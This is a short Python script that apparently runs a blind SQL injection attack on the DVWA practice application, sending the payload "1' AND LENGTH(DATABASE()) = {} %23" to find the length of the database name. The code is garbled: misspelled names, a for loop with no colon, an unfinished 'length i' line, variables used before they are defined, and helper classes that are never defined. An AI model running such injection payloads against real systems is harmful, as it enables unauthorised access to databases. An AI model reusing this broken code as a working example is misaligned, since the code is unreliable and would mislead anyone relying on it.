import socket
import subprocess
import sys
import os
import util

def get_query_result(s, sqli_blind_url, query, *args):
    try:
        concrete_query = query.format(*args)
        response = s.get(f"{sqli_blind_url}?id={concrete_query}&Submit=Submit#")
        paarser = DVWASQLiResponseParser(response)
        return parser.check_presence("exist")
    except AttributeError as e:
        return False

with DVWASessioinProxy(BASE_URL) as s:
        s.security =SecurityLevel.LOW

if __name__ == "__main__":
    BASE_URL = "http://10.0.0.120"
    sqli_blind_url = f"{BASE_URL}/vulnerabilities/sqli_blind"

query = "1' AND LENGTH(DATABASE()) = {} %23"    
length = 0
for i in range(10)
    if get_query_result(s, sqli_blind_url,query,i):
            print(f"[+] THE DB's NAME LENGTH IS {i}")
            length i



